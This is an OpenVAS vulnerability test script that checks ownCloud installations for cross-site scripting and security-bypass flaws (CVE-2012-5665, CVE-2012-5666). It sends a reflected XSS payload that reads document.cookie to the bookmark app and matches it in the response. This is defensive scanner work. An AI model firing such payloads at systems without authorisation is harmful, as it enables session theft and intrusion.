###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_owncloud_xss_n_sec_bypass_vuln.nasl 2934 2016-03-24 08:23:55Z benallard $
#
# ownCloud Cross-Site Scripting and Security Bypass Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "
  Impact Level: Application";

CPE = "cpe:/a:owncloud:owncloud";
SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803742";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 2934 $");
  script_cve_id("CVE-2012-5665", "CVE-2012-5666");
  script_bugtraq_id(57030);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-03-24 09:23:55 +0100 (Thu, 24 Mar 2016) $");
  script_tag(name:"creation_date", value:"2013-08-21 18:01:53 +0530 (Wed, 21 Aug 2013)");
  script_name("ownCloud Cross-Site Scripting and Security Bypass Vulnerabilities");

  tag_summary =
"This host is running ownCloud and is prone to cross-site scripting and
security bypass vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP request and check whether it is able to read
cookie or not.";

  tag_insight =
"Multiple flaws are due to,
- The application not verifying permissions when accessing settings.php
  can be exploited to change the app configuration for user_webdavauth
  and user_ldap and subsequently login as arbitrary users.
- Certain input passed to apps/bookmark/index.php is not properly sanitised
  before being returned to the user.";

  tag_impact =
"Successful exploitation will allow remote attacker to execute arbitrary HTML
or script code or discloses sensitive information resulting in loss of
confidentiality.";

  tag_affected =
"ownCloud versions 4.0.x before 4.0.10 and 4.5.x before 4.5.5";

  tag_solution =
"Upgrade to ownCloud 4.5.5, 4.0.10 or later,
For updates refer to http://owncloud.org";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_xref(name : "URL" , value : "http://owncloud.org/changelog");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51614");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2012/12/22/2");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2012/12/22/5");
  script_xref(name : "URL" , value : "https://github.com/owncloud/apps/commit/eafa9b2#diff-0");
  script_summary("Check if ownCloud vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_owncloud_detect.nasl");
  script_mandatory_keys("owncloud/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
dir = "";

## get the port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Get the location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## construct the attack reaquest
url = string(dir, "/apps/bookmark/index.php?PATH_INFO=",
                  "'><script>alert(document.cookie);</script>");

## confirm the exploit
if(http_vuln_check(port:port, url:url, pattern:"><script>alert" +
                  "\(document.cookie\)</script>", check_header:TRUE))
{
  security_message(port:port);
  exit(0);
}
